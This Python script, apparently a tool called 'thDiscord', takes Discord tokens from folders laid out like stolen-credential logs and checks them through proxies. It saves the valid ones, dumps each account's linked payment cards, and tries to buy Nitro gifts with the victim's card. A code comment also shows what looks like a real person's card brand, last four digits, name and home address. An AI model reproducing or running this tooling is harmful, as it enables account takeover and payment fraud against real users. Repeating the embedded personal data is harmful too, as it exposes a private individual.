from threading import Thread
from math import ceil, trunc
from requests import get, post
from time import sleep
from json import loads

import os
import glob


def slices(lst, n):
	for i in range(0, len(lst), n):
		yield lst[i : i + n]

def proxyCheck(proxy):
	try:
		proxies = {"https": proxy}
		resp = get("https://www.google.com", proxies=proxies, timeout=2)
		if resp.status_code == 200:
			return True
		else:
			return False
	except Exception as ex:
		return False

def doWork(args):
	print(args[0], "Start.")
	for token in args[2]:
		try:
			sleep(5)
			p = {"https": args[1]}
			h =  {'Authorization': token}
			me = get("https://discordapp.com/api/v9/users/@me", headers=h, proxies=p)
			if me.status_code == 200:
				info = loads(me.text)
				print("[✔]", token, info['username'], info["email"])
				with open("Discord[Good].txt", "a") as f: f.write(token + "\n")

				# Проверка на подвязаные карты
				cc = get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=h, proxies=p)
				with open("Discord[CreditCard].txt", "a") as f: f.write(str(cc.text))
				if len(cc.text) > 100: # Если подвязана карта , то длина сообщения больше 100 символов.
					print(cc.text) # [{"id": "915160349395795998", "type": 1, "invalid": true, "flags": 2, "screen_status": 0, "brand": "mastercard", "last_4": "4174", "expires_month": 2, "expires_year": 2025, "billing_address": {"name": "dylan lombard", "line_1": "12 triton street", "line_2": null, "city": "selection park", "state": "gauteng", "country": "ZA", "postal_code": "1559"}, "country": "ZA", "payment_gateway": 1, "default": false}]
					ids = loads(cc.text)[0]["id"]

					# Покупка гифта.
					d = {'gift':True,'sku_subscription_plan_id':'511651880837840896','payment_source_id':ids,'expected_amount':999}
					buy = post("https://discord.com/api/v9/store/skus/521847234246082599/purchase", headers=h, json=d).text
					print(buy) # {"message": "Invalid payment", "code": 100008}
				

				# Купленые гифты
				gift = get("https://discord.com/api/v9/users/@me/entitlements/gifts", headers=h, proxies=p)
				print("Gift", gift.text) # [] | {"message": "You need to verify your account in order to perform this action.", "code": 40002}
				with open("Discord[Gift].txt", "a") as f: f.write(str(gift.text) + "\n")

			else:
				print("[-]", token, end="\r")
		except Exception as ex:
			print(ex)
			continue


print("[thDiscord] v1.0 @HashSnake 2022")
print("Checker valid account, account with cc , try buy nitro , check gift for nitro.")
path = input("[Path]> ")
core = 50
print("Load txt files...")
txt_file = glob.glob(os.path.join(path, "*/Discord/Tokens.txt")) # ищем все текстовики в папке.
tokenList = []
for txt in txt_file:
	with open(txt, "r", encoding="utf-8") as f:
		token = f.readline().strip()
		tokenList.append(token)
tokenList = list(set(tokenList))
print("Loads Token:", len(tokenList))

with open("proxy.txt", "r") as f: proxy = f.readlines()
rawProxy = [p.strip() for p in proxy]

countLine = ceil(len(tokenList) / core)
packToken = list(slices(tokenList, countLine))

proxyList = []
print("Cheking proxy...")

pCount = 0
for proxy in rawProxy:
	p = proxyCheck(proxy)
	if p:
		pCount += 1
		print(pCount, "[Proxy], Good.", end="\r")
		proxyList.append(proxy)
		if len(proxyList) >= core:
			break

threads = []

for i in range(core):
	thread = Thread(target=doWork, args=([i, proxyList[i], packToken[i]],))
	threads.append(thread)
	thread.start()

for thread in threads:
	thread.join()